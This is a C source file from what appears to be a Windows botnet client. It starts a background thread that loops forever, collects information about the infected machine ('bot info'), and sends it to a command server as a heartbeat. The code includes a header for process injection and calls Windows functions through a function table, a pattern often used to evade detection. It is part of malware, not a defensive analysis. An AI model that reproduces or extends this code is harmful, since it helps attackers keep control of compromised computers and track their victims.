#define WIN32_LEAN_AND_MEAN

#include <windows.h>

#include "bot.h"
#include "connection.h"

#include "functions_table.h"

#include "process_injections.h"

#include "global_config.h"
#include "debug.h"

#include "manager_init.h"

//
HANDLE t_bot_auto_update_lastseen_thread = NULL;
DWORD t_bot_auto_update_lastseen_id = 0;

//
extern BOT_INFORMATION MANAGER_BOT_INFO;


//
static DWORD WINAPI bot_auto_update_lastseen_thread(LPVOID null_param)
{
	int bot_info_buffer_size = 0;

	//
	while (1) {
		l_Sleep(BOT_AUTO_UPDATE_LASTSEEN_INTERVAL);

		DBG_MSG("bot_auto_update_lastseen_thread: new iteration comes\n");

		//bool res = manager->init_bot_id();

		//if (!res) continue;

		//
		bool res = manager_init_bot_info();

		if (!res) continue;

		//
		print_bot_info(MANAGER_BOT_INFO);

		//
		char* bot_info_buffer = bot_info_2_buffer(MANAGER_BOT_INFO, &bot_info_buffer_size);


		//
		bool command_ret = COMMAND_TYPE_1(COMMAND_TYPE_1_BOT_INFO, (char*)bot_info_buffer, bot_info_buffer_size);

		//
		if (!command_ret) {
			DBG_MSG("bot_auto_update_lastseen_thread: Failed to send to server. continue now.\n");
			continue;
		}


	}



	return 0;
}

//
bool manager_init_bot_auto_update_lastseen_thread()
{
	t_bot_auto_update_lastseen_thread = l_CreateThread(
		NULL,
		0,
		bot_auto_update_lastseen_thread,
		NULL,
		0,
		&t_bot_auto_update_lastseen_id
	);

	if (t_bot_auto_update_lastseen_thread == NULL) {
		DBG_MSG(" manager_init_bot_auto_update_lastseen_thread() - l_CreateThread() failed, error code: %d\n", l_GetLastError());

		return false;
	}

	//
	DBG_MSG("manager_init_bot_auto_update_lastseen_thread() - SUCCESS.\n");


	//
	return true;
}